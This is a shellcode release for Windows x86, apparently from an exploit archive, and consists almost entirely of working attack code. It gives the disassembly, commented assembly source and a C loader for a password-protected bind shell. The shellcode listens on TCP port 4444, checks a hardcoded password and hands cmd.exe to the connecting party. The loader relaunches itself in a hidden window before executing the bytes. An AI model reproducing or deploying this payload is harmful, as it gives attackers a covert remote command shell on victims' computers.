/*
	# Title : Windows x86 password protected bind shell tcp shellcode
	# Date : 12-09-2016
	# Author : Roziul Hasan Khan Shifat
	# size : 637 bytes
	# Tested On : Windows 7 ultimate x86 x64
	# Email : shifath12@gmail.com
*/

/*
Disassembly of section .text:

00000000 <_start>:
   0:	99                   	cltd
   1:	64 8b 42 30          	mov    %fs:0x30(%edx),%eax
   5:	8b 40 0c             	mov    0xc(%eax),%eax
   8:	8b 70 14             	mov    0x14(%eax),%esi
   b:	ad                   	lods   %ds:(%esi),%eax
   c:	96                   	xchg   %eax,%esi
   d:	ad                   	lods   %ds:(%esi),%eax
   e:	8b 78 10             	mov    0x10(%eax),%edi
  11:	8b 5f 3c             	mov    0x3c(%edi),%ebx
  14:	01 fb                	add    %edi,%ebx
  16:	8b 5b 78             	mov    0x78(%ebx),%ebx
  19:	01 fb                	add    %edi,%ebx
  1b:	8b 73 20             	mov    0x20(%ebx),%esi
  1e:	01 fe                	add    %edi,%esi

00000020 <g>:
  20:	42                   	inc    %edx
  21:	ad                   	lods   %ds:(%esi),%eax
  22:	01 f8                	add    %edi,%eax
  24:	81 38 47 65 74 50    	cmpl   $0x50746547,(%eax)
  2a:	75 f4                	jne    20 <g>
  2c:	81 78 04 72 6f 63 41 	cmpl   $0x41636f72,0x4(%eax)
  33:	75 eb                	jne    20 <g>
  35:	81 78 08 64 64 72 65 	cmpl   $0x65726464,0x8(%eax)
  3c:	75 e2                	jne    20 <g>
  3e:	8b 73 1c             	mov    0x1c(%ebx),%esi
  41:	01 fe                	add    %edi,%esi
  43:	8b 0c 96             	mov    (%esi,%edx,4),%ecx
  46:	01 f9                	add    %edi,%ecx
  48:	83 ec 50             	sub    $0x50,%esp
  4b:	8d 34 24             	lea    (%esp),%esi
  4e:	89 0e                	mov    %ecx,(%esi)
  50:	99                   	cltd
  51:	68 73 41 41 41       	push   $0x41414173
  56:	88 54 24 02          	mov    %dl,0x2(%esp)
  5a:	68 6f 63 65 73       	push   $0x7365636f
  5f:	68 74 65 50 72       	push   $0x72506574
  64:	68 43 72 65 61       	push   $0x61657243
  69:	8d 14 24             	lea    (%esp),%edx
  6c:	52                   	push   %edx
  6d:	57                   	push   %edi
  6e:	ff d1                	call   *%ecx
  70:	83 c4 10             	add    $0x10,%esp
  73:	89 46 04             	mov    %eax,0x4(%esi)
  76:	99                   	cltd
  77:	68 65 73 73 41       	push   $0x41737365
  7c:	88 54 24 03          	mov    %dl,0x3(%esp)
  80:	68 50 72 6f 63       	push   $0x636f7250
  85:	68 45 78 69 74       	push   $0x74697845
  8a:	8d 14 24             	lea    (%esp),%edx
  8d:	52                   	push   %edx
  8e:	57                   	push   %edi
  8f:	ff 16                	call   *(%esi)
  91:	83 c4 0c             	add    $0xc,%esp
  94:	89 46 08             	mov    %eax,0x8(%esi)
  97:	99                   	cltd
  98:	52                   	push   %edx
  99:	68 61 72 79 41       	push   $0x41797261
  9e:	68 4c 69 62 72       	push   $0x7262694c
  a3:	68 4c 6f 61 64       	push   $0x64616f4c
  a8:	8d 14 24             	lea    (%esp),%edx
  ab:	52                   	push   %edx
  ac:	57                   	push   %edi
  ad:	ff 16                	call   *(%esi)
  af:	83 c4 0c             	add    $0xc,%esp
  b2:	99                   	cltd
  b3:	68 6c 6c 6c 6c       	push   $0x6c6c6c6c
  b8:	88 54 24 02          	mov    %dl,0x2(%esp)
  bc:	68 33 32 2e 64       	push   $0x642e3233
  c1:	68 77 73 32 5f       	push   $0x5f327377
  c6:	8d 14 24             	lea    (%esp),%edx
  c9:	52                   	push   %edx
  ca:	ff d0                	call   *%eax
  cc:	83 c4 0c             	add    $0xc,%esp
  cf:	97                   	xchg   %eax,%edi
  d0:	8b 5f 3c             	mov    0x3c(%edi),%ebx
  d3:	01 fb                	add    %edi,%ebx
  d5:	8b 5b 78             	mov    0x78(%ebx),%ebx
  d8:	01 fb                	add    %edi,%ebx
  da:	8b 5b 1c             	mov    0x1c(%ebx),%ebx
  dd:	01 fb                	add    %edi,%ebx
  df:	99                   	cltd
  e0:	66 ba c8 01          	mov    $0x1c8,%dx
  e4:	8b 04 13             	mov    (%ebx,%edx,1),%eax
  e7:	01 f8                	add    %edi,%eax
  e9:	89 46 0c             	mov    %eax,0xc(%esi)
  ec:	8b 43 50             	mov    0x50(%ebx),%eax
  ef:	01 f8                	add    %edi,%eax
  f1:	89 46 10             	mov    %eax,0x10(%esi)
  f4:	8b 43 04             	mov    0x4(%ebx),%eax
  f7:	01 f8                	add    %edi,%eax
  f9:	89 46 14             	mov    %eax,0x14(%esi)
  fc:	8b 03                	mov    (%ebx),%eax
  fe:	01 f8                	add    %edi,%eax
 100:	89 46 18             	mov    %eax,0x18(%esi)
 103:	8b 43 30             	mov    0x30(%ebx),%eax
 106:	01 f8                	add    %edi,%eax
 108:	89 46 1c             	mov    %eax,0x1c(%esi)
 10b:	8b 43 08             	mov    0x8(%ebx),%eax
 10e:	01 f8                	add    %edi,%eax
 110:	89 46 20             	mov    %eax,0x20(%esi)
 113:	8b 43 3c             	mov    0x3c(%ebx),%eax
 116:	01 f8                	add    %edi,%eax
 118:	89 46 24             	mov    %eax,0x24(%esi)
 11b:	66 ba 88 01          	mov    $0x188,%dx
 11f:	8b 04 13             	mov    (%ebx,%edx,1),%eax
 122:	01 f8                	add    %edi,%eax
 124:	89 46 28             	mov    %eax,0x28(%esi)
 127:	8b 43 48             	mov    0x48(%ebx),%eax
 12a:	01 f8                	add    %edi,%eax
 12c:	89 46 2c             	mov    %eax,0x2c(%esi)
 12f:	99                   	cltd
 130:	8d 4e 30             	lea    0x30(%esi),%ecx
 133:	c6 01 02             	movb   $0x2,(%ecx)
 136:	66 c7 41 02 11 5c    	movw   $0x5c11,0x2(%ecx)
 13c:	89 51 04             	mov    %edx,0x4(%ecx)
 13f:	89 51 08             	mov    %edx,0x8(%ecx)
 142:	89 51 0c             	mov    %edx,0xc(%ecx)
 145:	8d 4e 40             	lea    0x40(%esi),%ecx
 148:	c7 01 45 6e 74 65    	movl   $0x65746e45,(%ecx)
 14e:	c7 41 04 72 20 70 61 	movl   $0x61702072,0x4(%ecx)
 155:	c7 41 08 73 73 20 63 	movl   $0x63207373,0x8(%ecx)
 15c:	c7 41 0c 6f 64 65 3a 	movl   $0x3a65646f,0xc(%ecx)
 163:	99                   	cltd
 164:	66 ba 90 01          	mov    $0x190,%dx
 168:	29 d4                	sub    %edx,%esp
 16a:	8d 0c 24             	lea    (%esp),%ecx
 16d:	83 c2 72             	add    $0x72,%edx
 170:	51                   	push   %ecx
 171:	52                   	push   %edx
 172:	ff 56 0c             	call   *0xc(%esi)
 175:	99                   	cltd
 176:	52                   	push   %edx
 177:	52                   	push   %edx
 178:	52                   	push   %edx
 179:	b2 06                	mov    $0x6,%dl
 17b:	52                   	push   %edx
 17c:	99                   	cltd
 17d:	42                   	inc    %edx
 17e:	52                   	push   %edx
 17f:	42                   	inc    %edx
 180:	52                   	push   %edx
 181:	ff 56 28             	call   *0x28(%esi)
 184:	97                   	xchg   %eax,%edi
 185:	99                   	cltd
 186:	42                   	inc    %edx
 187:	52                   	push   %edx
 188:	8d 0c 24             	lea    (%esp),%ecx
 18b:	42                   	inc    %edx
 18c:	52                   	push   %edx
 18d:	51                   	push   %ecx
 18e:	83 c2 02             	add    $0x2,%edx
 191:	52                   	push   %edx
 192:	99                   	cltd
 193:	66 ba ff ff          	mov    $0xffff,%dx
 197:	52                   	push   %edx
 198:	57                   	push   %edi
 199:	ff 56 10             	call   *0x10(%esi)
 19c:	99                   	cltd
 19d:	b2 10                	mov    $0x10,%dl
 19f:	52                   	push   %edx
 1a0:	8d 4e 30             	lea    0x30(%esi),%ecx
 1a3:	52                   	push   %edx
 1a4:	51                   	push   %ecx
 1a5:	57                   	push   %edi
 1a6:	ff 56 14             	call   *0x14(%esi)
 1a9:	99                   	cltd
 1aa:	42                   	inc    %edx
 1ab:	52                   	push   %edx
 1ac:	57                   	push   %edi
 1ad:	ff 56 1c             	call   *0x1c(%esi)
 1b0:	99                   	cltd
 1b1:	8d 5e 30             	lea    0x30(%esi),%ebx
 1b4:	89 13                	mov    %edx,(%ebx)
 1b6:	89 53 04             	mov    %edx,0x4(%ebx)
 1b9:	89 53 08             	mov    %edx,0x8(%ebx)
 1bc:	89 53 0c             	mov    %edx,0xc(%ebx)

000001bf <a>:
 1bf:	99                   	cltd
 1c0:	b2 10                	mov    $0x10,%dl
 1c2:	52                   	push   %edx
 1c3:	8d 0c 24             	lea    (%esp),%ecx
 1c6:	8d 5e 30             	lea    0x30(%esi),%ebx
 1c9:	51                   	push   %ecx
 1ca:	53                   	push   %ebx
 1cb:	57                   	push   %edi
 1cc:	ff 56 18             	call   *0x18(%esi)
 1cf:	99                   	cltd
 1d0:	50                   	push   %eax
 1d1:	52                   	push   %edx
 1d2:	b2 10                	mov    $0x10,%dl
 1d4:	52                   	push   %edx
 1d5:	8d 4e 40             	lea    0x40(%esi),%ecx
 1d8:	51                   	push   %ecx
 1d9:	50                   	push   %eax
 1da:	ff 56 2c             	call   *0x2c(%esi)
 1dd:	58                   	pop    %eax
 1de:	89 c3                	mov    %eax,%ebx
 1e0:	99                   	cltd
 1e1:	52                   	push   %edx
 1e2:	b2 10                	mov    $0x10,%dl
 1e4:	52                   	push   %edx
 1e5:	8d 4e 40             	lea    0x40(%esi),%ecx
 1e8:	51                   	push   %ecx
 1e9:	50                   	push   %eax
 1ea:	ff 56 24             	call   *0x24(%esi)
 1ed:	8d 4e 40             	lea    0x40(%esi),%ecx
 1f0:	81 39 64 61 6d 6e    	cmpl   $0x6e6d6164,(%ecx)
 1f6:	75 5e                	jne    256 <kick_out>
 1f8:	81 79 04 5f 69 74 21 	cmpl   $0x2174695f,0x4(%ecx)
 1ff:	75 55                	jne    256 <kick_out>
 201:	81 79 08 24 24 23 23 	cmpl   $0x23232424,0x8(%ecx)
 208:	75 4c                	jne    256 <kick_out>
 20a:	81 79 0c 40 3b 2a 23 	cmpl   $0x232a3b40,0xc(%ecx)
 211:	75 43                	jne    256 <kick_out>
 213:	89 df                	mov    %ebx,%edi
 215:	83 ec 10             	sub    $0x10,%esp
 218:	8d 1c 24             	lea    (%esp),%ebx
 21b:	99                   	cltd
 21c:	57                   	push   %edi
 21d:	57                   	push   %edi
 21e:	57                   	push   %edi
 21f:	52                   	push   %edx
 220:	52                   	push   %edx
 221:	b2 ff                	mov    $0xff,%dl
 223:	42                   	inc    %edx
 224:	52                   	push   %edx
 225:	99                   	cltd
 226:	52                   	push   %edx
 227:	52                   	push   %edx
 228:	52                   	push   %edx
 229:	52                   	push   %edx
 22a:	52                   	push   %edx
 22b:	52                   	push   %edx
 22c:	52                   	push   %edx
 22d:	52                   	push   %edx
 22e:	52                   	push   %edx
 22f:	52                   	push   %edx
 230:	b2 44                	mov    $0x44,%dl
 232:	52                   	push   %edx
 233:	8d 0c 24             	lea    (%esp),%ecx
 236:	99                   	cltd
 237:	68 63 6d 64 41       	push   $0x41646d63
 23c:	88 54 24 03          	mov    %dl,0x3(%esp)
 240:	8d 04 24             	lea    (%esp),%eax
 243:	53                   	push   %ebx
 244:	51                   	push   %ecx
 245:	52                   	push   %edx
 246:	52                   	push   %edx
 247:	52                   	push   %edx
 248:	42                   	inc    %edx
 249:	52                   	push   %edx
 24a:	99                   	cltd
 24b:	52                   	push   %edx
 24c:	52                   	push   %edx
 24d:	50                   	push   %eax
 24e:	52                   	push   %edx
 24f:	ff 56 04             	call   *0x4(%esi)
 252:	50                   	push   %eax
 253:	ff 56 08             	call   *0x8(%esi)

00000256 <kick_out>:
 256:	53                   	push   %ebx
 257:	ff 56 20             	call   *0x20(%esi)
 25a:	8d 4e 40             	lea    0x40(%esi),%ecx
 25d:	c7 01 45 6e 74 65    	movl   $0x65746e45,(%ecx)
 263:	c7 41 04 72 20 70 61 	movl   $0x61702072,0x4(%ecx)
 26a:	c7 41 08 73 73 20 63 	movl   $0x63207373,0x8(%ecx)
 271:	c7 41 0c 6f 64 65 3a 	movl   $0x3a65646f,0xc(%ecx)
 278:	e9 42 ff ff ff       	jmp    1bf <a>
*/


 /*
section .text
	global _start
_start:

cdq
mov eax,[fs:edx+0x30] ;PEB
mov eax,[eax+0xc] ;PEB.Ldr
mov esi,[eax+0x14] ;PEB.Ldr->InMemOrderModuleList
lodsd
xchg esi,eax
lodsd
mov edi,[eax+0x10] ;kernel32.dll base address

mov ebx,[edi+0x3c]
add ebx,edi
mov ebx,[ebx+0x78]
add ebx,edi

mov esi,[ebx+0x20]
add esi,edi

g:
inc edx
lodsd
add eax,edi
cmp dword [eax],'GetP'
jne g
cmp dword [eax+4],'rocA'
jne g
cmp dword [eax+8],'ddre'
jne g

mov esi,[ebx+0x1c]
add esi,edi

mov ecx,[esi+edx*4]
add ecx,edi

sub esp,80
lea esi,[esp]

mov [esi],dword ecx ;GetProcAddress() 0

;-----------------------
;address CreateProcessA()

cdq
push 0x41414173
mov [esp+2],byte dl
push 0x7365636f
push 0x72506574
push 0x61657243

lea edx,[esp]

push edx
push edi

call ecx

;----------------------
add esp,16
mov [esi+4],dword eax ;CreateProcessA() 4
;-------------------------------
;address ExitProcess()
cdq
push 0x41737365
mov [esp+3],byte dl
push 0x636f7250
push 0x74697845

lea edx,[esp]

push edx
push edi

call [esi]

;-------------------------------
add esp,12
mov [esi+8],dword eax ;ExitProcess() 8
;----------------------------------
cdq
push edx
push 0x41797261
push 0x7262694c
push 0x64616f4c
lea edx,[esp]
push edx
push edi

call [esi]

add esp,12
;------------------------
;loading ws2_32.dll
cdq
push 0x6c6c6c6c
mov [esp+2],byte dl
push 0x642e3233
push 0x5f327377

lea edx,[esp]
push edx


call eax

;---------------------------------
add esp,12

xchg edi,eax


mov ebx,[edi+0x3c]
add ebx,edi
mov ebx,[ebx+0x78]
add ebx,edi

mov ebx,[ebx+0x1c]
add ebx,edi

cdq
mov dx,456

mov eax,[ebx+edx]
add eax,edi

mov [esi+12],dword eax ;WSAStartup() 12

mov eax,[ebx+80]
add eax,edi

mov [esi+16],dword eax ;setsockopt() 16

mov eax,[ebx+4]
add eax,edi

mov [esi+20],dword eax ;bind() 20

mov eax,[ebx]
add eax,edi

mov [esi+24],dword eax ;accept() 24

mov eax,[ebx+48]
add eax,edi

mov [esi+28],dword eax ;listen() 28

mov eax,[ebx+8]
add eax,edi

mov [esi+32],dword eax ;closesocket() 32

mov eax,[ebx+60]
add eax,edi

mov [esi+36],dword eax ;recv() 36

mov dx,392
mov eax,[ebx+edx]
add eax,edi

mov [esi+40],dword eax ;WSASocketA() 40



mov eax,[ebx+72]
add eax,edi

mov [esi+44],dword eax ;send() 44

;---------------------------------
cdq
lea ecx,[esi+48]
mov [ecx],byte 2
mov [ecx+2],word 0x5c11
mov [ecx+4],edx
mov [ecx+8],edx
mov [ecx+12],edx

lea ecx,[esi+64]
mov [ecx],dword 'Ente'
mov [ecx+4],dword 'r pa'
mov [ecx+8],dword 'ss c'
mov [ecx+12],dword 'ode:'

;-----------------------------------

;WSAStartup(514,&WSADATA)

cdq
mov dx,400
sub esp,edx
lea ecx,[esp]
add edx,114

push ecx
push edx

call [esi+12]

;--------------------------------
;---------------------------
;;WSASocketA(2,1,6,0,0,0)
cdq

push edx
push edx
push edx
mov dl,6
push edx
cdq
inc edx
push edx
inc edx
push edx

call [esi+40]

xchg edi,eax ;SOCKET
;-------------------------------------
;setsockopt(SOCKET,0xffff,4,&1,2)
cdq
inc edx
push edx
lea ecx,[esp]

inc edx
push edx
push ecx
add edx,2
push edx
cdq
mov dx,0xffff
push edx
push edi

call [esi+16]
;----------------------
;bind(SOCKET,(struct sockaddr *)&struct sockaddr_in,16)

cdq
mov dl,16
push edx
lea ecx,[esi+48]

push edx
push ecx
push edi

call [esi+20]
;----------------------------
;listen(SOCKET,1)
cdq
inc edx
push edx
push edi

call [esi+28]


cdq
lea ebx,[esi+48]

mov [ebx],edx
mov [ebx+4],edx
mov [ebx+8],edx
mov [ebx+12],edx





a:
;-----------------------------
;accept(SOCKET,(struct sockaddr *)&struct sockaddr_in,&16)
cdq
mov dl,16
push edx
lea ecx,[esp]
lea ebx,[esi+48]

push ecx
push ebx
push edi

call [esi+24]
;---------------------------------
;send(SOCKET,char *a[],16,0)
cdq

push eax

push edx
mov dl,16
push edx
lea ecx,[esi+64]
push ecx
push eax

call [esi+44]
;-----------------------
pop eax

;recv(SOCKET,char *a[],16,0)
mov ebx,eax

cdq
push edx
mov dl,16
push edx
lea ecx,[esi+64]
push ecx
push eax

call [esi+36]
;----------------------------------

lea ecx,[esi+64]

cmp dword [ecx],'damn'
jne kick_out
cmp dword [ecx+4],'_it!'
jne kick_out
cmp dword [ecx+8],'$$##'
jne kick_out
cmp dword [ecx+12],'@;*#'
jne kick_out

;password-> damn_it!$$##@;*#


mov edi,ebx
sub esp,16
lea ebx,[esp]

cdq
push edi
push edi
push edi

push edx
push edx

mov dl,255
inc edx
push edx
cdq

push edx
push edx
push edx
push edx
push edx

push edx
push edx
push edx
push edx
push edx

mov dl,68
push edx
lea ecx,[esp]

cdq

push 'cmdA'
mov [esp+3],byte dl
lea eax,[esp]

;-------------------------------------------------
push ebx
push ecx

push edx
push edx
push edx

inc edx
push edx
cdq

push edx
push edx

push eax
push edx

call [esi+4]
push eax
call [esi+8]



kick_out:
push ebx
call [esi+32]

lea ecx,[esi+64]
mov [ecx],dword 'Ente'
mov [ecx+4],dword 'r pa'
mov [ecx+8],dword 'ss c'
mov [ecx+12],dword 'ode:'

jmp a
 */



#include<windows.h>
#include<stdio.h>
#include<shellapi.h>
#include<stdlib.h>

char shellcode[]="\x99\x64\x8b\x42\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x78\x10\x8b\x5f\x3c\x01\xfb\x8b\x5b\x78\x01\xfb\x8b\x73\x20\x01\xfe\x42\xad\x01\xf8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x73\x1c\x01\xfe\x8b\x0c\x96\x01\xf9\x83\xec\x50\x8d\x34\x24\x89\x0e\x99\x68\x73\x41\x41\x41\x88\x54\x24\x02\x68\x6f\x63\x65\x73\x68\x74\x65\x50\x72\x68\x43\x72\x65\x61\x8d\x14\x24\x52\x57\xff\xd1\x83\xc4\x10\x89\x46\x04\x99\x68\x65\x73\x73\x41\x88\x54\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x8d\x14\x24\x52\x57\xff\x16\x83\xc4\x0c\x89\x46\x08\x99\x52\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x8d\x14\x24\x52\x57\xff\x16\x83\xc4\x0c\x99\x68\x6c\x6c\x6c\x6c\x88\x54\x24\x02\x68\x33\x32\x2e\x64\x68\x77\x73\x32\x5f\x8d\x14\x24\x52\xff\xd0\x83\xc4\x0c\x97\x8b\x5f\x3c\x01\xfb\x8b\x5b\x78\x01\xfb\x8b\x5b\x1c\x01\xfb\x99\x66\xba\xc8\x01\x8b\x04\x13\x01\xf8\x89\x46\x0c\x8b\x43\x50\x01\xf8\x89\x46\x10\x8b\x43\x04\x01\xf8\x89\x46\x14\x8b\x03\x01\xf8\x89\x46\x18\x8b\x43\x30\x01\xf8\x89\x46\x1c\x8b\x43\x08\x01\xf8\x89\x46\x20\x8b\x43\x3c\x01\xf8\x89\x46\x24\x66\xba\x88\x01\x8b\x04\x13\x01\xf8\x89\x46\x28\x8b\x43\x48\x01\xf8\x89\x46\x2c\x99\x8d\x4e\x30\xc6\x01\x02\x66\xc7\x41\x02\x11\x5c\x89\x51\x04\x89\x51\x08\x89\x51\x0c\x8d\x4e\x40\xc7\x01\x45\x6e\x74\x65\xc7\x41\x04\x72\x20\x70\x61\xc7\x41\x08\x73\x73\x20\x63\xc7\x41\x0c\x6f\x64\x65\x3a\x99\x66\xba\x90\x01\x29\xd4\x8d\x0c\x24\x83\xc2\x72\x51\x52\xff\x56\x0c\x99\x52\x52\x52\xb2\x06\x52\x99\x42\x52\x42\x52\xff\x56\x28\x97\x99\x42\x52\x8d\x0c\x24\x42\x52\x51\x83\xc2\x02\x52\x99\x66\xba\xff\xff\x52\x57\xff\x56\x10\x99\xb2\x10\x52\x8d\x4e\x30\x52\x51\x57\xff\x56\x14\x99\x42\x52\x57\xff\x56\x1c\x99\x8d\x5e\x30\x89\x13\x89\x53\x04\x89\x53\x08\x89\x53\x0c\x99\xb2\x10\x52\x8d\x0c\x24\x8d\x5e\x30\x51\x53\x57\xff\x56\x18\x99\x50\x52\xb2\x10\x52\x8d\x4e\x40\x51\x50\xff\x56\x2c\x58\x89\xc3\x99\x52\xb2\x10\x52\x8d\x4e\x40\x51\x50\xff\x56\x24\x8d\x4e\x40\x81\x39\x64\x61\x6d\x6e\x75\x5e\x81\x79\x04\x5f\x69\x74\x21\x75\x55\x81\x79\x08\x24\x24\x23\x23\x75\x4c\x81\x79\x0c\x40\x3b\x2a\x23\x75\x43\x89\xdf\x83\xec\x10\x8d\x1c\x24\x99\x57\x57\x57\x52\x52\xb2\xff\x42\x52\x99\x52\x52\x52\x52\x52\x52\x52\x52\x52\x52\xb2\x44\x52\x8d\x0c\x24\x99\x68\x63\x6d\x64\x41\x88\x54\x24\x03\x8d\x04\x24\x53\x51\x52\x52\x52\x42\x52\x99\x52\x52\x50\x52\xff\x56\x04\x50\xff\x56\x08\x53\xff\x56\x20\x8d\x4e\x40\xc7\x01\x45\x6e\x74\x65\xc7\x41\x04\x72\x20\x70\x61\xc7\x41\x08\x73\x73\x20\x63\xc7\x41\x0c\x6f\x64\x65\x3a\xe9\x42\xff\xff\xff";

int main(int i,char *a[])
{

	int mode;



	if(i==1)
	mode=1;
	else
	mode=atoi(a[1]);

switch(mode)
{


	case 78:
	(* (int(*)())shellcode )();
	break;

	case 1:
	ShellExecute(NULL,NULL,a[0],"78",NULL,0);
	default:
	break;
}


return 0;
}